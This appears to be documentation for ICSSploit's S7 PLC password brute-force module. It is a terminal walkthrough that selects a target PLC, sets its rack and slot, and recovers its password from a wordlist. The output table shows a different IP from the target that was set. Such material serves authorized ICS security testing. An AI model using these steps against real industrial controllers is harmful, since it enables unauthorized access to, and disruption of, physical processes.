# S7 Bruteforece

# Use S7 bruteforece module
    root@kali:~/Desktop/temp/isf# python isf.py
    
      _____ _____  _____ _____ _____  _      ____ _____ _______
     |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
       | || |    | (___| (___ | |__) | |   | |  | || |    | |
       | || |     \___ \\___ \|  ___/| |   | |  | || |    | |
      _| || |____ ____) |___) | |    | |___| |__| || |_   | |
     |_____\_____|_____/_____/|_|    |______\____/_____|  |_|
    
    
                    ICS Exploitation Framework
    
    Note     : ICSSPOLIT is fork from routersploit at
               https://github.com/reverse-shell/routersploit
    Dev Team : wenzhe zhu(dark-lbp)
    Version  : 1.0
    
    Exploits: 2 Scanners: 0 Creds: 14
    
    ICS Exploits:
        PLC: 2          ICS Switch: 0
        Software: 0
    
    isf > search bruteforce
    creds/ftp_bruteforce
    creds/http_basic_bruteforce
    creds/http_digest_bruteforce
    creds/http_form_bruteforce
    creds/s7_bruteforce
    creds/snmp_bruteforce
    creds/ssh_bruteforce
    creds/telnet_bruteforce
    isf > use creds/s7_bruteforce

    
# set options
    isf (S7 300/400 PLC Password Bruteforce) > show options

    Target options:
    
       Name       Current settings     Description
       ----       ----------------     -----------
       target                          Target address e.g. 192.168.1.1
       port       102                  Target Port
    
    
    Module options:
    
       Name                Current settings                                                                                Description
       ----                ----------------                                                                                -----------
       slot                2                                                                                               CPU slot number.
       threads             3                                                                                               Number of threads
       stop_on_success     yes                                                                                             Stop on first valid community string
       verbose             0                                                                                               Verbose scapy output. 1: display, 0: hide
       password            file:///root/Desktop/temp/isf/icssploit/wordlists/passwords.txt                                 password string or file with community strings (file://)
       rack                0                                                                                               CPU rack number.

    isf (S7 300/400 PLC Password Bruteforce) > set target 192.168.1.10
    [+] {'target': '192.168.1.10'}
    # set target slot
    isf (S7 300/400 PLC Password Bruteforce) > set slot 3
    [+] {'slot': '3'}

# run module
    isf (S7 300/400 PLC Password Bruteforce) > run
    [*] Running module...
    [*] Elapsed time:  11.8677530289 seconds
    [+] Credentials found!
    
       Target             Port     password
       ------             ----     --------
       192.168.70.210     102      password
    isf (S7 300/400 PLC Password Bruteforce) >
